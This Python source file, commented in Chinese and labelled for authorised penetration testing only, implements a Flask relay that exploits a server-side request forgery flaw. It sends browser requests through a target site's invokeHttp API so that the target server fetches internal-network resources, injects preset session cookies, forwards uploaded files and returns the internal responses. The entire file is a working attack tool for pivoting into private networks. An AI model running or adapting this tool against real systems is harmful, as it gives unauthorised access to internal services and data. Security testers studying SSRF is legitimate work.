# -*- coding: utf-8 -*-
"""
SSRF 中转代理（升级版）
仅用于授权渗透测试 / 安全研究环境。

功能：
  将打到本地 8081 端口的请求封装为 SSRF 载荷，发给目标站点的
  invokeHttp 接口，由目标服务器代为请求内网资源，并把结果
  修正 Content-Type 后返回给浏览器。

用法：
  python ssrf_proxy.py                          # 默认配置启动
  python ssrf_proxy.py --port 8081 --no-burp    # 不走 Burp 代理
  浏览器访问: http://127.0.0.1:8081/?u=http://10.0.0.5/admin
"""

import argparse
import base64
import logging
import os
from urllib.parse import urlparse
from os.path import splitext, basename

import requests
from flask import Flask, request, Response

# ---------------- 配置（可用环境变量覆盖，避免硬编码凭据） ----------------
DEST_URL = os.getenv("SSRF_API", "http://api.xxx.com/api/invokeHttp")
AUTH_COOKIE = os.getenv("SSRF_AUTH_COOKIE", "key1=value1;key2=value2;")
INJECT_HEADER_VALUE = os.getenv("SSRF_INJECT_COOKIE", "username.test=ext.bmw.test;")
BURP_PROXY = os.getenv("SSRF_PROXY", "http://127.0.0.1:8080")
ACCESS_TOKEN = os.getenv("SSRF_ACCESS_TOKEN", "")  # 设置后请求需带 ?token= 校验

CONNECT_TIMEOUT = 5    # 连接超时（秒）
READ_TIMEOUT = 60      # 读取超时（秒），SSRF 代请求通常较慢

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("ssrf-proxy")

app = Flask(__name__)
session = requests.Session()  # 复用 TCP 连接

# 不应逐跳透传的响应头
HOP_BY_HOP_HEADERS = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailer", "transfer-encoding", "upgrade", "content-encoding",
    "content-length",
}

MIME_MAP = {
    ".png": "image/png",
    ".js": "application/javascript",
    ".jpg": "image/jpeg",
    ".gif": "image/gif",
    ".jpeg": "image/jpeg",
    ".ico": "image/x-icon",
    ".css": "text/css",
    ".svg": "image/svg+xml",
    ".json": "application/json",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
}


def get_filetype(url):
    """按 URL 扩展名推断 Content-Type，保证浏览器正确渲染静态资源。"""
    try:
        _, file_ext = splitext(basename(urlparse(url).path))
        return MIME_MAP.get(file_ext.lower(), "text/html")
    except Exception:
        return "text/html"


def build_proxy_headers(resp_headers, target_url):
    """白名单式透传响应头，剔除逐跳头并修正 Content-Type。"""
    headers = {}
    for name, value in resp_headers.items():
        if name.lower() not in HOP_BY_HOP_HEADERS:
            headers[name] = value
    headers["Content-Type"] = get_filetype(target_url)
    return headers


def extract_content(resp):
    """
    从 invokeHttp 接口的响应中提取实际内容。
    优先取 JSON 中的 data 字段；支持 base64 字段；非 JSON 时降级为原始字节。
    """
    try:
        payload = resp.json()
    except ValueError:
        log.warning("响应非 JSON，按原始内容透传")
        return resp.content

    if isinstance(payload, dict):
        # 二进制内容建议由接口返回 base64 字段
        if payload.get("data_b64"):
            try:
                return base64.b64decode(payload["data_b64"])
            except Exception:
                log.warning("data_b64 解码失败，尝试 data 字段")
        data = payload.get("data", "")
        if isinstance(data, str):
            return data.encode("utf-8")
        return str(data).encode("utf-8")

    return resp.content


def collect_files():
    """把客户端上传的文件打包进 SSRF 载荷。"""
    filist = []
    for field, storage in request.files.items():
        filist.append({
            "field": field,
            "filename": storage.filename,
            "content_b64": base64.b64encode(storage.read()).decode("ascii"),
        })
    return filist


@app.before_request
def before_request():
    # 简单访问控制：设置 SSrf_ACCESS_TOKEN 后必须携带
    if ACCESS_TOKEN and request.args.get("token") != ACCESS_TOKEN:
        return Response("forbidden", status=403)

    # 目标 URL 从参数取，未指定时回退到请求自身的 URL
    target_url = request.args.get("u") or request.headers.get("X-Target-Url")
    if not target_url:
        return Response("missing target url, use /?u=http://target/path", status=400)

    body = request.get_data() if request.method != "GET" else (request.data or b"")

    dest_data = {
        "url": target_url,
        "requestType": request.method.lower(),
        "files": collect_files(),
        "body": body.decode("utf-8", errors="replace") if isinstance(body, bytes) else (body or ""),
        "jsonParam": "",
        "headers": [{"header": "cookie", "value": INJECT_HEADER_VALUE}],
        "format": "utf-8",
    }

    headers = dict(request.headers)
    headers["Cookie"] = AUTH_COOKIE
    headers["Host"] = urlparse(DEST_URL).netloc
    headers["Content-Type"] = "application/json"

    try:
        resp = session.post(
            url=DEST_URL,
            headers=headers,
            json=dest_data,
            proxies=app.config["PROXIES"],
            timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
            allow_redirects=False,  # 不自动跟随，302 原样透传给浏览器
        )
    except requests.exceptions.ProxyError:
        log.error("无法连接 Burp 代理 %s，请确认 Burp 已启动或用 --no-burp 运行", BURP_PROXY)
        return Response("burp proxy unavailable", status=502)
    except requests.exceptions.Timeout:
        log.error("请求超时: %s", target_url)
        return Response("upstream timeout", status=504)
    except requests.exceptions.RequestException as e:
        log.error("请求失败: %s", e)
        return Response("upstream error: %s" % e, status=502)

    log.info("%s %s -> %s (%d bytes)", request.method, target_url,
             resp.status_code, len(resp.content))

    new_headers = build_proxy_headers(resp.headers, target_url)

    # 重定向：把 Location 透传给浏览器，由浏览器自己跳
    if resp.status_code in (301, 302, 303, 307, 308):
        return Response("redirect", status=resp.status_code, headers=new_headers)

    content = extract_content(resp)
    return Response(content, status=resp.status_code, headers=new_headers)


def main():
    parser = argparse.ArgumentParser(description="SSRF 中转代理（仅限授权测试）")
    parser.add_argument("--host", default="127.0.0.1", help="监听地址，默认仅本机")
    parser.add_argument("--port", type=int, default=8081, help="监听端口")
    parser.add_argument("--no-burp", action="store_true", help="不经过 Burp 代理")
    parser.add_argument("--debug", action="store_true", help="开启 Flask 调试（仅本机！）")
    args = parser.parse_args()

    app.config["PROXIES"] = None if args.no_burp else {"http": BURP_PROXY, "https": BURP_PROXY}

    if args.debug:
        log.warning("调试模式仅允许本机使用，切勿暴露到网络！")
        app.run(host="127.0.0.1", port=args.port, debug=True)
    else:
        try:
            from waitress import serve
            log.info("waitress 启动于 http://%s:%d", args.host, args.port)
            serve(app, host=args.host, port=args.port, threads=8)
        except ImportError:
            log.warning("未安装 waitress（pip install waitress），回退到 Flask 内置服务器")
            app.run(host=args.host, port=args.port, debug=False)


if __name__ == "__main__":
    main()
